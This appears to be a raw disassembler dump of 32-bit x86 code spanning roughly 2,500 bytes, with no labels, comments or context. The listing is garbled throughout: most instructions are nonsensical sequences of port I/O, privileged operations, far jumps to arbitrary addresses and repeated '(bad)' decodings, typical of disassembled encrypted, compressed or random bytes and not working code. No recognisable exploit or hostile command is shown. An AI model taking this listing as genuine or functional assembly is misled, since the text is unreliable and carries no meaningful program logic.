  418afe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418aff:	loopne 0x418ae8
  418b01:	inc    edi
  418b02:	push   ds
  418b03:	push   ss
  418b04:	xchg   ebx,eax
  418b05:	outs   dx,DWORD PTR ds:[esi]
  418b06:	dec    ebx
  418b07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b08:	lea    esp,[esp+edi*1+0x6d]
  418b0c:	cs inc ecx
  418b0e:	adc    eax,0x67b122e1
  418b13:	pop    edi
  418b14:	adc    al,0x1b
  418b16:	sbb    eax,0xdf1e9729
  418b1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b1c:	rcr    DWORD PTR [edi+esi*8+0x1a25fde8],0xc3
  418b24:	in     al,0xc8
  418b26:	pop    ebp
  418b27:	fldenv [edi]
  418b29:	call   0x62438768
  418b2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b2f:	stos   DWORD PTR es:[edi],eax
  418b30:	cs cs pop es
  418b33:	daa    
  418b34:	and    BYTE PTR [ebp+ebx*1-0x8e3d946],ah
  418b3b:	mov    ebx,DWORD PTR [eax-0x1d]
  418b3e:	sub    BYTE PTR [ecx+0x40034cf3],cl
  418b44:	pop    ds
  418b45:	scas   eax,DWORD PTR es:[edi]
  418b46:	add    DWORD PTR [ecx],edi
  418b48:	cmp    eax,0x90674f6f
  418b4d:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b4f:	or     eax,0xd3e3215b
  418b54:	pop    ecx
  418b55:	test   edx,0x7641eab4
  418b5b:	pop    ebp
  418b5c:	pop    ecx
  418b5d:	mov    cl,0x96
  418b5f:	ss out 0xd4,eax
  418b62:	or     cl,ah
  418b64:	lds    eax,FWORD PTR ds:0xaa1c2a50
  418b6a:	aam    0x5d
  418b6c:	mov    eax,0x2863e3a6
  418b71:	dec    ebx
  418b72:	and    eax,0x6f8ea8e7
  418b77:	mov    eax,0x2c5267c3
  418b7c:	xor    al,0x38
  418b7e:	(bad)  [esi-0x4829f7ac]
  418b84:	or     BYTE PTR [edx],dh
  418b86:	jbe    0x418bd1
  418b88:	cmc    
  418b89:	adc    edi,DWORD PTR [ebp-0x7ca7020f]
  418b8f:	sbb    DWORD PTR [eax+0x48],ecx
  418b92:	xor    ch,ah
  418b94:	fcmovu st,st(4)
  418b96:	pop    ds
  418b97:	sbb    BYTE PTR [esi-0x2a670893],ah
  418b9d:	sub    dh,BYTE PTR [ebp+0x2df952f2]
  418ba3:	add    DWORD PTR [ebp-0x3009b8f9],0x73
  418baa:	push   edx
  418bab:	add    eax,0xc9f48370
  418bb0:	lahf   
  418bb1:	wbinvd 
  418bb3:	mov    ch,0x6f
  418bb5:	sbb    BYTE PTR ds:0xd6eb99a7,cl
  418bbb:	scas   eax,DWORD PTR es:[edi]
  418bbc:	out    0xcc,al
  418bbe:	sub    DWORD PTR [esi+0x69],0xd
  418bc2:	push   ss
  418bc3:	js     0x418b84
  418bc5:	push   edx
  418bc6:	test   al,0xaa
  418bc8:	dec    edi
  418bc9:	aas    
  418bca:	arpl   WORD PTR [eax+0x276aef8d],bx
  418bd0:	out    dx,al
  418bd1:	xchg   ebp,eax
  418bd2:	mov    ch,0x1c
  418bd4:	inc    edx
  418bd5:	xor    bh,ch
  418bd7:	mov    edx,fs
  418bd9:	call   0xc750088
  418bde:	and    ah,BYTE PTR [ebx]
  418be0:	fidiv  WORD PTR [edi]
  418be2:	cmp    bh,BYTE PTR [edi-0x63]
  418be5:	aad    0xfc
  418be7:	mov    esi,0xd4cd8eb7
  418bec:	push   ecx
  418bed:	cmp    BYTE PTR [ecx-0x1d049f6d],bl
  418bf3:	iret   
  418bf4:	ret    
  418bf5:	addr16 push eax
  418bf7:	and    BYTE PTR [esi-0x165f3b0a],dh
  418bfd:	daa    
  418bfe:	push   eax
  418bff:	mov    bh,0xe
  418c01:	xlat   BYTE PTR ds:[ebx]
  418c02:	imul   edx,DWORD PTR [edx],0x29
  418c05:	add    eax,DWORD PTR [ecx-0x43]
  418c08:	lds    edi,FWORD PTR [edx+edx*4]
  418c0b:	and    al,0x53
  418c0d:	mov    es,ebp
  418c0f:	fst    DWORD PTR [edi+0x6e]
  418c12:	and    BYTE PTR [edx+0x7f906347],bh
  418c18:	aas    
  418c19:	push   ecx
  418c1a:	mov    esi,0xd8a7ded5
  418c1f:	mov    ebp,0xc6feffcd
  418c24:	in     al,dx
  418c25:	or     BYTE PTR [eax+0x3f],0x7c
  418c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c2a:	sbb    cl,BYTE PTR [edi-0x76d27c56]
  418c30:	and    DWORD PTR [ecx],ebx
  418c32:	mov    ch,0x77
  418c34:	inc    esp
  418c35:	(bad)  
  418c36:	(bad)  
  418c37:	sbb    edi,DWORD PTR [ebp+0x22492f23]
  418c3d:	cmp    bl,BYTE PTR [ecx]
  418c3f:	cli    
  418c40:	or     ebp,DWORD PTR [edi+0x46]
  418c43:	leave  
  418c44:	dec    esp
  418c45:	adc    DWORD PTR [ebx+0x4944a571],esi
  418c4b:	test   BYTE PTR [edi],cl
  418c4d:	(bad)  
  418c4e:	dec    ebp
  418c4f:	cmp    eax,0x38327c90
  418c54:	push   0x6d
  418c56:	je     0x418c7f
  418c58:	sub    DWORD PTR [edi+0x49],edi
  418c5b:	rcl    BYTE PTR [esi-0x351c12b8],cl
  418c61:	nop
  418c62:	inc    ebx
  418c63:	gs nop
  418c65:	mov    ?,WORD PTR [edx+edi*2-0x59]
  418c69:	fisttp DWORD PTR [ebx+0x6e]
  418c6c:	add    BYTE PTR [eax+0x43721faa],ch
  418c72:	jns    0x418cd5
  418c74:	sar    DWORD PTR [esi-0x38c412a2],0x60
  418c7b:	push   cs
  418c7c:	xchg   edx,eax
  418c7d:	cli    
  418c7e:	stos   BYTE PTR es:[edi],al
  418c7f:	sbb    al,0x9d
  418c81:	cmp    DWORD PTR [ebp-0x50],edi
  418c84:	pop    ds
  418c85:	test   eax,0x4b266d13
  418c8a:	xor    DWORD PTR ds:0x12afd0a0,eax
  418c90:	ret    
  418c91:	and    al,0xa8
  418c93:	push   es
  418c94:	mov    ah,BYTE PTR [edi-0x7e]
  418c97:	mov    edi,DWORD PTR [ecx]
  418c99:	add    DWORD PTR [esi],ecx
  418c9b:	mov    eax,ds:0x2bff284a
  418ca0:	xor    DWORD PTR ds:0x5f05b3b8,edx
  418ca6:	aas    
  418ca7:	xor    BYTE PTR [edi],ch
  418ca9:	shl    DWORD PTR [esi+0x18619ff8],0x59
  418cb0:	dec    esi
  418cb1:	int3   
  418cb2:	add    eax,0x44387358
  418cb7:	pop    ecx
  418cb8:	call   0xcbe0:0x2efbb02
  418cbf:	xchg   edx,eax
  418cc0:	or     DWORD PTR [eax+0x58],ecx
  418cc3:	dec    edi
  418cc4:	xchg   edi,eax
  418cc5:	push   es
  418cc6:	cmp    eax,0x4117322a
  418ccb:	pop    edx
  418ccc:	mov    edi,0xca51d8cd
  418cd1:	jb     0x418c79
  418cd3:	jg     0x418d2f
  418cd5:	popa   
  418cd6:	cmp    ecx,edx
  418cd8:	(bad)  
  418cd9:	dec    eax
  418cda:	fldenv [edi-0x55a65231]
  418ce0:	add    DWORD PTR ds:0x9b22ab71,edx
  418ce6:	xchg   edi,eax
  418ce7:	cmp    al,0xfb
  418ce9:	shl    BYTE PTR [ecx-0x7b],1
  418cec:	push   es
  418ced:	sbb    DWORD PTR [esi],edx
  418cef:	enter  0x87cc,0x77
  418cf3:	test   DWORD PTR [esi-0x77822409],ebx
  418cf9:	lock nop
  418cfb:	pop    es
  418cfc:	rcr    BYTE PTR [esi-0x2f],0xbe
  418d00:	stc    
  418d01:	out    dx,al
  418d02:	push   esp
  418d03:	call   0x12dc:0xff656b14
  418d0a:	cwde   
  418d0b:	xor    al,0x2d
  418d0d:	mov    dl,0xd7
  418d0f:	je     0x418d2c
  418d11:	push   cs
  418d12:	sbb    BYTE PTR [eax+0x16],ch
  418d15:	or     DWORD PTR [edx+0x7e],ecx
  418d18:	div    esp
  418d1a:	in     eax,0x90
  418d1c:	inc    edi
  418d1d:	or     DWORD PTR [esp+ebp*4-0x7e],edi
  418d21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d22:	dec    ebx
  418d23:	inc    BYTE PTR [edi-0x63]
  418d26:	dec    BYTE PTR ds:0xfe87dfdf
  418d2c:	push   eax
  418d2d:	ficomp WORD PTR [ecx-0x67]
  418d30:	mov    al,0xb7
  418d32:	ins    DWORD PTR es:[edi],dx
  418d33:	inc    ecx
  418d34:	mov    esp,0x8e1291ad
  418d39:	mov    BYTE PTR [ebx-0x7294bd87],ah
  418d3f:	cmp    cl,BYTE PTR [edx+0x248cdf15]
  418d45:	out    0x31,eax
  418d47:	jnp    0x418dc3
  418d49:	sbb    BYTE PTR [ebx-0x38e5390b],dl
  418d4f:	fcomp  QWORD PTR [edx+eax*8]
  418d52:	ret    0xce54
  418d55:	ja     0x418cf6
  418d57:	jmp    0xbb0071e1
  418d5c:	std    
  418d5d:	add    BYTE PTR [ebx-0x1fc4ee3b],bl
  418d63:	pop    ebx
  418d64:	and    ecx,DWORD PTR [eax]
  418d66:	xor    ecx,DWORD PTR [esi+0x6d]
  418d69:	stos   BYTE PTR es:[edi],al
  418d6a:	std    
  418d6b:	fistp  DWORD PTR [ebp-0x4b]
  418d6e:	imul   ecx,DWORD PTR [ebp-0x6b],0xffffffe7
  418d72:	loopne 0x418d1a
  418d74:	pop    ds
  418d75:	sub    eax,0x250d35e3
  418d7a:	sbb    edx,edi
  418d7c:	fstp   QWORD PTR [eax]
  418d7e:	dec    esp
  418d7f:	sbb    DWORD PTR [edx+0x4c],0xffffff87
  418d83:	xor    edx,edx
  418d85:	mov    ch,BYTE PTR [eax+0x539a6a1e]
  418d8b:	or     al,0x58
  418d8d:	mov    eax,cr3
  418d90:	ja     0x418d40
  418d92:	mov    es,WORD PTR [edx]
  418d94:	xchg   ebx,eax
  418d95:	mov    eax,ds:0x71e6de49
  418d9a:	push   0xffffffe6
  418d9c:	xchg   ebp,eax
  418d9d:	sbb    BYTE PTR [edi+0x19],cl
  418da0:	push   cs
  418da1:	in     eax,dx
  418da2:	mov    bl,0x78
  418da4:	lock test ecx,0xa72f9e67
  418dab:	push   DWORD PTR [esi+0x2ea902e4]
  418db1:	mov    dl,0xa6
  418db3:	mov    edx,0x8cab5db4
  418db8:	mov    edi,edi
  418dba:	ja     0x418db1
  418dbc:	mov    bh,0x79
  418dbe:	mov    gs,WORD PTR [ebx+0x332c54c6]
  418dc4:	lahf   
  418dc5:	inc    edx
  418dc6:	retf   
  418dc7:	xor    al,0xa8
  418dc9:	inc    esi
  418dca:	stos   DWORD PTR es:[edi],eax
  418dcb:	xchg   ecx,eax
  418dcc:	sub    bh,ch
  418dce:	push   cs
  418dcf:	loop   0x418e43
  418dd1:	int    0x27
  418dd3:	xor    eax,0x63c5146e
  418dd8:	loope  0x418de9
  418dda:	in     al,0x9d
  418ddc:	rcr    DWORD PTR [edx-0x770690f2],1
  418de2:	jnp    0x418df7
  418de4:	push   edi
  418de5:	pop    ecx
  418de6:	cmp    ecx,ecx
  418de8:	arpl   WORD PTR [edi],si
  418dea:	adc    eax,0xbc3dc809
  418def:	fcomp  QWORD PTR [edx]
  418df1:	cld    
  418df2:	or     eax,0xef22c956
  418df7:	or     BYTE PTR cs:0xd1a6f267,ah
  418dfe:	in     al,dx
  418dff:	inc    ebx
  418e00:	jne    0x418d9b
  418e02:	mov    WORD PTR [edx+0x75dc35a5],gs
  418e08:	or     al,BYTE PTR [eax-0x3935c7cd]
  418e0e:	sbb    eax,0xf99ed1ac
  418e13:	jns    0x418e15
  418e15:	xchg   ebx,eax
  418e16:	and    DWORD PTR [ebp+0xa],eax
  418e19:	jp     0x418d9b
  418e1b:	dec    ebp
  418e1c:	call   0x8df44516
  418e21:	or     cl,cl
  418e23:	stos   BYTE PTR es:[edi],al
  418e24:	aas    
  418e25:	cmp    BYTE PTR ds:0xedba606e,bl
  418e2b:	mov    eax,DWORD PTR [ebx+0x18f4b13b]
  418e31:	xor    cl,bh
  418e33:	ds pop ss
  418e35:	adc    al,0x15
  418e37:	mov    fs,WORD PTR [edx-0x40fe6a52]
  418e3d:	xchg   ebx,eax
  418e3e:	shr    BYTE PTR [edx+0x4202c765],cl
  418e44:	xor    al,0xcd
  418e46:	std    
  418e47:	add    esp,edx
  418e49:	jae    0x418df0
  418e4b:	adc    ah,BYTE PTR [ebx]
  418e4d:	sti    
  418e4e:	xor    bl,BYTE PTR [ecx+0x62d5b9f1]
  418e54:	and    dh,0x4c
  418e57:	jae    0x418e31
  418e59:	scas   eax,DWORD PTR es:[edi]
  418e5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e5b:	jno    0x418e2c
  418e5d:	xchg   esi,eax
  418e5e:	pop    edi
  418e5f:	inc    ecx
  418e60:	mov    cl,0x61
  418e62:	jmp    0xa058941e
  418e67:	outs   dx,BYTE PTR ds:[esi]
  418e68:	sub    BYTE PTR [ebp+0x66fcd646],bh
  418e6e:	stos   BYTE PTR es:[edi],al
  418e6f:	ror    DWORD PTR [ecx-0x15],1
  418e72:	jmp    0x70113697
  418e77:	xchg   ebx,eax
  418e78:	add    esi,DWORD PTR [edx+eax*1-0x283617bc]
  418e7f:	int    0x1c
  418e81:	mov    eax,ds:0x5dc96649
  418e86:	push   ss
  418e87:	inc    DWORD PTR [edx]
  418e89:	mov    WORD PTR [edi+0xd8c809b],ds
  418e8f:	push   0x133b69b8
  418e94:	(bad)  
  418e95:	cli    
  418e96:	adc    al,0x43
  418e98:	in     al,dx
  418e99:	adc    BYTE PTR [ebx+esi*1+0x31],ch
  418e9d:	xchg   ecx,esp
  418e9f:	mov    eax,ds:0x43cc4680
  418ea4:	pop    ecx
  418ea5:	adc    BYTE PTR [eax],cl
  418ea7:	lods   eax,DWORD PTR gs:[esi]
  418ea9:	shl    BYTE PTR [ebx+0x5e],1
  418eac:	sub    ecx,ebx
  418eae:	daa    
  418eaf:	mov    bl,0x96
  418eb1:	mov    bh,dl
  418eb3:	pop    ss
  418eb4:	and    al,0xe9
  418eb6:	sahf   
  418eb7:	(bad)
  418eba:	push   esp
  418ebb:	jmp    0xa1b36330
  418ec0:	lods   eax,DWORD PTR ds:[esi]
  418ec1:	js     0x418eda
  418ec3:	es pushf 
  418ec5:	mov    edi,0x7f86abba
  418eca:	pop    ecx
  418ecb:	imul   edi,DWORD PTR [esi],0x2b
  418ece:	lahf   
  418ecf:	or     dh,bl
  418ed1:	out    0x8d,al
  418ed3:	pop    DWORD PTR [eax-0xa]
  418ed6:	and    ah,bh
  418ed8:	cmc    
  418ed9:	push   esp
  418eda:	test   BYTE PTR [ebx+0x3967e2e4],bl
  418ee0:	stos   BYTE PTR es:[edi],al
  418ee1:	fsubr  st,st(6)
  418ee3:	rol    DWORD PTR [eax],1
  418ee5:	add    DWORD PTR [esi-0x5f],0x4212924b
  418eec:	adc    bh,cl
  418eee:	inc    edi
  418eef:	addr16 mov al,0x73
  418ef2:	sar    BYTE PTR [eax+0x4b2e08a5],cl
  418ef8:	sub    edi,ebx
  418efa:	or     ebp,DWORD PTR [edi]
  418efc:	repz push cs
  418efe:	addr16 mov bh,0x42
  418f01:	xchg   esi,eax
  418f02:	push   0x5
  418f04:	mov    ebx,esp
  418f06:	dec    edx
  418f07:	das    
  418f08:	xor    al,BYTE PTR [ebx+0x459d298c]
  418f0e:	popf   
  418f0f:	shl    DWORD PTR [ebp+0x399f8268],0x54
  418f16:	call   FWORD PTR [esi]
  418f18:	mov    fs,ecx
  418f1a:	call   0xb78a7e5e
  418f1f:	enter  0x16ac,0xe0
  418f23:	mov    esi,0xe2bffec7
  418f28:	mov    ds:0x53437fc5,al
  418f2d:	push   eax
  418f2e:	js     0x418f17
  418f30:	jnp    0x418f60
  418f32:	or     al,0x9a
  418f34:	cdq    
  418f35:	sub    eax,0x745dcd7d
  418f3a:	pop    edi
  418f3b:	ja     0x418f39
  418f3d:	xor    ch,dl
  418f3f:	outs   dx,BYTE PTR ds:[esi]
  418f40:	arpl   WORD PTR [ebp+0x664a9985],si
  418f46:	add    DWORD PTR [ebx+0x6f8f03f3],edi
  418f4c:	mov    cl,0xba
  418f4e:	fcom   QWORD PTR [esi-0x32687e26]
  418f54:	nop
  418f55:	or     eax,0xeb571069
  418f5a:	adc    al,0xd7
  418f5c:	cli    
  418f5d:	mov    ds:0x444b76e3,al
  418f62:	and    ah,BYTE PTR [esi]
  418f64:	cmp    ah,BYTE PTR [ebx+0x2884dcfc]
  418f6a:	ds data16 mov ah,0xf
  418f6e:	xchg   ebx,eax
  418f6f:	fisttp DWORD PTR ss:[ecx+0x790aed3c]
  418f76:	idiv   BYTE PTR [edi]
  418f78:	imul   ebx,DWORD PTR [edi+0x65079a8],0x56
  418f7f:	(bad)  
  418f80:	and    ch,ah
  418f82:	jbe    0x418fd3
  418f84:	lds    eax,FWORD PTR [ebx]
  418f86:	mov    al,ds:0x9a5bdcac
  418f8b:	fiadd  WORD PTR [ebx-0x60]
  418f8e:	fs sbb al,0x32
  418f91:	and    esp,edx
  418f93:	jp     0x418fd3
  418f95:	call   0x94fea552
  418f9a:	retf   0xa824
  418f9d:	jno    0x418f2e
  418f9f:	int3   
  418fa0:	mov    cl,0xd3
  418fa2:	adc    ebp,DWORD PTR [edx+0x1b]
  418fa5:	fwait
  418fa6:	mov    gs,WORD PTR [edx-0x14]
  418fa9:	daa    
  418faa:	mov    eax,ds:0xf3bd4b6
  418faf:	ds cs mov WORD PTR ds:[edx-0x28fa8a58],cs
  418fb8:	cld    
  418fb9:	movq   QWORD PTR [edi+0x1b],mm2
  418fbd:	popf   
  418fbe:	loope  0x419011
  418fc0:	lods   eax,DWORD PTR ds:[esi]
  418fc1:	lock popf 
  418fc3:	arpl   sp,cx
  418fc5:	jl     0x418ff4
  418fc7:	dec    ebx
  418fc8:	arpl   WORD PTR [edi+0x3a19218],ax
  418fce:	int    0xbc
  418fd0:	scas   al,BYTE PTR es:[edi]
  418fd1:	sub    cl,al
  418fd3:	sbb    ebp,DWORD PTR [ebx+ebx*1]
  418fd6:	xor    BYTE PTR [ebx+0x66c43030],al
  418fdc:	pop    ss
  418fdd:	jne    0x418f92
  418fdf:	ins    DWORD PTR es:[edi],dx
  418fe0:	xchg   DWORD PTR [edi-0x7e],ecx
  418fe3:	xchg   ebx,eax
  418fe4:	push   eax
  418fe5:	adc    eax,0x8deeeda9
  418fea:	inc    ebp
  418feb:	jl     0x419012
  418fed:	add    ebx,DWORD PTR ds:0xe5373f37
  418ff3:	xchg   edi,eax
  418ff4:	and    eax,0x64074015
  418ff9:	call   0x8743a9a3
  418ffe:	ror    BYTE PTR [ecx-0x4169e107],0xfc
  419005:	fcmove st,st(0)
  419007:	and    eax,0x2b0dee35
  41900c:	mov    ebx,0x0
	...
  4191e5:	adc    eax,0x773f6240
  4191ea:	aas    
  4191eb:	pop    ebp
  4191ec:	push   0xffffff86
  4191ee:	jb     0x419252
  4191f0:	stc    
  4191f1:	inc    esp
  4191f2:	retf   
  4191f3:	pop    ecx
  4191f4:	xchg   ebp,eax
  4191f5:	pop    ebx
  4191f6:	mov    WORD PTR [ecx],es
  4191f8:	add    BYTE PTR [eax],ah
  4191fa:	pop    es
  4191fb:	add    BYTE PTR [eax],al
  4191fd:	aaa    
  4191fe:	pushf  
  4191ff:	dec    ecx
  419200:	ins    BYTE PTR es:[edi],dx
  419201:	xchg   BYTE PTR [edx-0x43ab883],bh
  419207:	loope  0x4191f4
  419209:	xor    eax,0xe91eb4c4
  41920e:	dec    esp
  41920f:	pop    esp
  419210:	(bad)  
  419211:	push   eax
  419212:	jne    0x419245
  419214:	shl    ah,0x7d
  419217:	(bad)  
  419218:	pop    ss
  419219:	cmp    ebp,DWORD PTR [esi]
  41921b:	fdivr  DWORD PTR [esi]
  41921d:	mov    al,0xa8
  41921f:	outs   dx,BYTE PTR ds:[esi]
  419220:	dec    edx
  419221:	loop   0x419262
  419223:	lock cmp ebx,DWORD PTR [ebx]
  419226:	fstp   DWORD PTR [esi]
  419228:	inc    esi
  419229:	test   eax,0x1cf68a5f
  41922e:	pop    ds
  41922f:	push   esi
  419230:	cmp    DWORD PTR ds:0x9b8474c7,ebp
  419236:	rcl    DWORD PTR [edi+ecx*1-0x5c],1
  41923a:	mov    eax,ds:0xd7a876d6
  41923f:	ins    BYTE PTR es:[edi],dx
  419240:	popa   
  419241:	addr16 pop ebp
  419243:	sar    ah,1
  419245:	fdiv   DWORD PTR [ebp-0x52dd89b6]
  41924b:	xor    al,0x8c
  41924d:	out    dx,al
  41924e:	in     al,0xb1
  419250:	inc    ecx
  419251:	cmp    al,0xd8
  419253:	imul   esp,DWORD PTR [ebp-0x26f0079c],0x5311830
  41925d:	dec    ebx
  41925e:	push   0xffffffe7
  419260:	mov    cl,BYTE PTR [ecx+edx*1-0x20131a5b]
  419267:	mov    ?,WORD PTR [edx+edx*8-0x3d]
  41926b:	fbstp  TBYTE PTR [eax+0x6d7cf9f1]
  419271:	mov    ch,0x46
  419273:	cmp    BYTE PTR [ebx],0xf1
  419276:	sbb    al,0xaf
  419278:	outs   dx,DWORD PTR ds:[esi]
  419279:	xchg   edi,eax
  41927a:	(bad)  
  41927b:	ror    BYTE PTR [ebp+0xa],cl
  41927e:	push   ecx
  41927f:	cmp    DWORD PTR [eax-0x33],esp
  419282:	nop
  419283:	call   0xfae5481e
  419288:	pop    es
  419289:	rcl    BYTE PTR [ebp-0x3],0xfc
  41928d:	cmp    eax,0x965d868b
  419292:	frstor [edx-0x3369591b]
  419298:	loopne 0x419291
  41929a:	mov    ds:0xa76533c5,al
  41929f:	mov    esi,0xb6955184
  4192a4:	cmp    BYTE PTR [ebx],dh
  4192a6:	jge    0x41929b
  4192a8:	mov    cl,0x23
  4192aa:	xchg   ebx,eax
  4192ab:	cli    
  4192ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192ad:	mov    ah,0xd8
  4192af:	imul   edx,DWORD PTR [edi+0x5f],0x7f15fedd
  4192b6:	cwde   
  4192b7:	cs std 
  4192b9:	repnz out dx,eax
  4192bb:	call   0x32588acc
  4192c0:	pushf  
  4192c1:	int    0x0
  4192c3:	push   cs
  4192c4:	mov    ecx,0x3321848c
  4192c9:	mov    ds:0x8c80c9fe,al
  4192ce:	inc    eax
  4192cf:	xchg   edi,eax
  4192d0:	popa   
  4192d1:	xlat   BYTE PTR ds:[ebx]
  4192d2:	mov    edi,0x7c1e48c1
  4192d7:	or     DWORD PTR [eax-0x72705b7a],edx
  4192dd:	push   eax
  4192de:	sbb    BYTE PTR ss:[edi+0x50],bl
  4192e2:	push   esi
  4192e3:	outs   dx,BYTE PTR ds:[esi]
  4192e4:	dec    eax
  4192e5:	mov    ecx,0xf674e228
  4192ea:	je     0x419353
  4192ec:	mov    ah,0xec
  4192ee:	mov    dh,0x5
  4192f0:	mov    ds:0x534c5ef,eax
  4192f5:	mov    fs,WORD PTR [ebp-0x64]
  4192f8:	pop    eax
  4192f9:	ret    0x28cc
  4192fc:	lods   eax,DWORD PTR ds:[esi]
  4192fd:	pop    ebp
  4192fe:	out    dx,al
  4192ff:	aaa    
  419300:	mov    ch,0x3
  419302:	sar    DWORD PTR [edx+0xc4895d7],1
  419308:	test   al,0x80
  41930a:	stos   BYTE PTR es:[edi],al
  41930b:	je     0x419381
  41930d:	sbb    esi,DWORD PTR [ecx-0x16]
  419310:	xchg   esp,eax
  419311:	daa    
  419312:	sub    al,0xf0
  419314:	pop    ebp
  419315:	push   es
  419316:	add    BYTE PTR [edi+0x4629e75f],cl
  41931c:	mov    ch,0x63
  41931e:	and    BYTE PTR [ebx+0x638dfbb0],bh
  419324:	data16 aas 
  419326:	jmp    0x2757:0x7f41e4cd
  41932d:	pop    eax
  41932e:	jo     0x4192d8
  419330:	inc    esp
  419331:	je     0x4193ab
  419333:	push   ss
  419334:	out    dx,eax
  419335:	inc    eax
  419336:	xchg   esp,eax
  419337:	ror    BYTE PTR [ebp-0x37],1
  41933a:	(bad)  
  41933c:	into   
  41933d:	cmp    esi,DWORD PTR [edi]
  41933f:	mov    WORD PTR [ecx-0x6a57b1c5],ss
  419345:	ins    BYTE PTR es:[edi],dx
  419346:	cmp    DWORD PTR [ecx],0x5af8c08b
  41934c:	push   ecx
  41934d:	add    eax,0xbdfb86a8
  419352:	repnz sbb BYTE PTR [edx-0x35],bh
  419356:	and    dh,BYTE PTR ds:0xb213489f
  41935c:	dec    edi
  41935d:	inc    esi
  41935e:	sub    DWORD PTR [ecx],ebx
  419360:	dec    eax
  419361:	test   eax,0xa932b27c
  419366:	add    ecx,DWORD PTR [esi]
  419368:	ds xor esp,ebx
  41936b:	neg    BYTE PTR [edx]
  41936d:	xchg   edx,eax
  41936e:	(bad)  [eax-0x1e]
  419371:	cli    
  419372:	daa    
  419373:	stos   BYTE PTR es:[edi],al
  419374:	int3   
  419375:	hlt    
  419376:	jle    0x419360
  419378:	mov    esi,0xc5f2c018
  41937d:	or     bh,0x96
  419380:	test   DWORD PTR [eax],esp
  419382:	inc    edx
  419383:	mov    dl,0xe6
  419385:	pop    esi
  419386:	loopne 0x41936d
  419388:	xchg   esp,eax
  419389:	add    ecx,DWORD PTR [edx+0x4c2da73e]
  41938f:	jnp    0x419319
  419391:	mov    al,ds:0xfe171157
  419396:	fs fwait
  419398:	aad    0x38
  41939a:	fwait
  41939b:	push   ss
  41939c:	(bad)  
  41939d:	dec    edi
  41939e:	fwait
  41939f:	push   ebp
  4193a0:	(bad)  
  4193a1:	ficomp WORD PTR [edi-0x1c961103]
  4193a7:	pop    ecx
  4193a8:	sub    DWORD PTR [eax+0x3807d937],edi
  4193ae:	jno    0x4193df
  4193b0:	jp     0x4193ed
  4193b2:	je     0x41934e
  4193b4:	rdtsc  
  4193b6:	lea    eax,[eax+0x70]
  4193b9:	adc    ah,BYTE PTR [edi+ecx*1+0x54]
  4193bd:	fisttp WORD PTR [ebp+0x5d]
  4193c0:	xchg   BYTE PTR [eax-0x55],dl
  4193c3:	lea    ecx,[edi+edi*4]
  4193c6:	icebp  
  4193c7:	out    dx,al
  4193c8:	pop    eax
  4193c9:	out    0x71,al
  4193cb:	dec    edi
  4193cc:	or     eax,0x79df8da5
  4193d1:	(bad)  
  4193d3:	ins    BYTE PTR es:[edi],dx
  4193d4:	pop    ebp
  4193d5:	retf   
  4193d6:	mov    dl,0xf7
  4193d8:	ror    DWORD PTR [edi+0x2],0x97
  4193dc:	xor    al,0x52
  4193de:	cmp    eax,0xc78e7a3c
  4193e3:	test   eax,0x71622940
  4193e8:	pop    ss
  4193e9:	mov    ebx,eax
  4193eb:	dec    ebx
  4193ec:	adc    eax,0xdd4a5bc4
  4193f1:	shl    DWORD PTR [edi+0x2d],0xf6
  4193f5:	and    BYTE PTR [edi+edx*1+0x76],bl
  4193f9:	push   edi
  4193fa:	jne    0x4193a4
  4193fc:	pop    ss
  4193fd:	xor    edi,DWORD PTR [eax+0x2d]
  419400:	jo     0x4193af
  419402:	sub    bh,BYTE PTR [edx]
  419404:	add    eax,DWORD PTR [edx+ecx*8+0x7e]
  419408:	std    
  419409:	inc    esp
  41940a:	popa   
  41940b:	jp     0x419454
  41940d:	or     DWORD PTR [ebx+0x5fe2058],ebx
  419413:	sar    DWORD PTR [ebp-0x50abcc33],1
  419419:	ror    BYTE PTR [eax-0x6a],cl
  41941c:	xchg   DWORD PTR ds:0x70da281a,ebx
  419422:	add    eax,0xa57bb70e
  419427:	pop    esi
  419428:	hlt    
  419429:	push   ebx
  41942a:	not    edx
  41942c:	ror    DWORD PTR [ebp-0x78f2dfea],1
  419432:	ins    DWORD PTR es:[edi],dx
  419433:	mov    ds:0xdbf8fb46,al
  419438:	or     BYTE PTR [edx+0x7c],bl
  41943b:	les    edi,FWORD PTR [edi]
  41943d:	push   0x4b
  41943f:	sbb    al,0xb7
  419441:	push   0xffffffc6
  419443:	out    dx,eax
  419444:	lds    ebx,FWORD PTR [eax+0x3a]
  419447:	and    eax,0x9dce4901
  41944c:	jns    0x4193e7
  41944e:	and    eax,0x7f8744d1
  419453:	pusha  
  419454:	mov    ebx,0x55fb878
  419459:	pop    ss
  41945a:	jp     0x4194b9
  41945c:	hlt    
  41945d:	mov    WORD PTR ds:0x10268a22,?
  419463:	mov    edx,0x1101716
  419468:	ins    DWORD PTR es:[edi],dx
  419469:	fsubr  QWORD PTR [edx-0x47]
  41946c:	xor    bh,dl
  41946e:	aas    
  41946f:	sub    edi,DWORD PTR [ebp-0x30a9a1ab]
  419475:	xchg   esi,eax
  419476:	sbb    al,0xfa
  419478:	call   0x84b6:0xeb061aea
  41947f:	repz mov ebp,DWORD PTR [edi-0x2e79c4e]
  419486:	jge    0x4194eb
  419488:	lods   eax,DWORD PTR ds:[esi]
  419489:	mov    bl,0x43
  41948b:	daa    
  41948c:	xor    BYTE PTR [esi+edi*8+0x5b],bl
  419490:	(bad)  
  419491:	stc    
  419492:	mov    eax,ds:0xc275f2d4
  419497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419498:	das    
  419499:	jns    0x4194e5
  41949b:	add    ebp,eax
  41949d:	or     BYTE PTR [esi+esi*2+0x4a4ee9c8],bh
  4194a4:	pushf  
  4194a5:	pop    ds
  4194a6:	jnp    0x419441
  4194a8:	xchg   ecx,eax
  4194a9:	aaa    
  4194aa:	cli    
  4194ab:	(bad)  
  4194ad:	mov    edx,0x73a2ac13
  4194b2:	push   ss
  4194b3:	fisub  DWORD PTR [ecx-0x4e]
  4194b6:	lods   eax,DWORD PTR ds:[esi]
